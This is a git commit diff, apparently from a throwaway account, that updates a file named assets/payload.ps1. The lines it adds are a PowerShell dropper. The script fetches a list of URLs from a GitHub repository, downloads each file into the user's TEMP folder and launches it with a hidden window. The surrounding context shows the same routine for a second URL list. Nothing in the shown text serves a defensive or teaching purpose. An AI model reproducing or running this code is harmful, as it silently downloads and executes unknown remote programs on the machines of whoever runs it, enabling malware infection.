33cf7cd85b7f5b30c3049b9d450051190df1683e
faker-0000099 <pawnrate536@stackfl.site>
2026-04-02 17:54:32 +0700

    Update payload.ps1

--- assets/payload.ps1
+++ assets/payload.ps1
@@ -1,3 +1,15 @@
+$urls = (iwr "https://github.com/discord-mess/good-lucky/raw/refs/heads/main/best_urls.txt").Content -split "`n"
+
+foreach ($u in $urls) {
+    $u = $u.Trim()
+    if ($u) {
+        $path = "$env:TEMP\$(Split-Path $u -Leaf)"
+        iwr $u -OutFile $path
+        Start-Process $path -WindowStyle Hidden
+    }
+}
+
+
 $urls = (iwr "https://github.com/discord-mess/good-lucky/raw/refs/heads/main/urls.txt").Content -split "`n"
 
 foreach ($u in $urls) {
